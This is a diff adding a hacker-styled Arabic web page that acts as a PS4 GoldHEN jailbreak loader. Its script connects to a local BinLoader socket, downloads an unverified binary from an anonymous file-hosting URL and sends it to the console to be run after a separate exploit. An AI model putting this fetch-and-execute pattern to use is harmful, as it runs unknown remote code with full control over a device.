@@ -1,0 +1,81 @@
+<!DOCTYPE html><html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>💀 RIDERMAX REAL HOST</title><style>
+body{
+ background:#0b0f1a;
+ color:#00ffaa;
+ text-align:center;
+ font-family:monospace;
+}
+
+h1{
+ text-shadow:0 0 20px #00ffaa;
+}
+
+button{
+ background:#00ffaa;
+ color:black;
+ padding:20px 50px;
+ border:none;
+ border-radius:50px;
+ font-size:22px;
+ cursor:pointer;
+ box-shadow:0 0 30px #00ffaa;
+}
+
+#log{
+ background:black;
+ margin:20px;
+ padding:10px;
+ height:220px;
+ overflow:auto;
+ text-align:left;
+ direction:ltr;
+}
+</style></head><body><h1>@ridermax707</h1>
+<h2>🔥 GoldHEN Loader (ONLINE)</h2><button onclick="run()">💀 هكرني ابن بنية</button>
+
+<div id="log"></div><script>
+const logBox = document.getElementById("log");
+
+function log(t){
+ logBox.innerHTML += "[ "+new Date().toLocaleTimeString()+" ] "+t+"<br>";
+ logBox.scrollTop = logBox.scrollHeight;
+}
+
+function run(){
+
+ log("🚀 بدء التشغيل...");
+ log("📡 محاولة الاتصال بـ BinLoader...");
+
+ let socket = new WebSocket("ws://127.0.0.1:9020");
+ socket.binaryType = "arraybuffer";
+
+ socket.onopen = ()=>{
+  log("✅ تم الاتصال");
+
+  fetch("https://files.catbox.moe/6e7po9.bin")
+  .then(res=>{
+    if(!res.ok){
+      throw new Error("فشل تحميل الملف");
+    }
+    return res.arrayBuffer();
+  })
+  .then(buf=>{
+    socket.send(buf);
+    log("🎉 تم تشغيل GoldHEN بنجاح!");
+  })
+  .catch(err=>{
+    log("❌ خطأ: "+err.message);
+  });
+ };
+
+ socket.onerror = ()=>{
+  log("❌ فشل الاتصال - شغل exploit أول");
+ };
+
+}
+</script></body>
+</html>
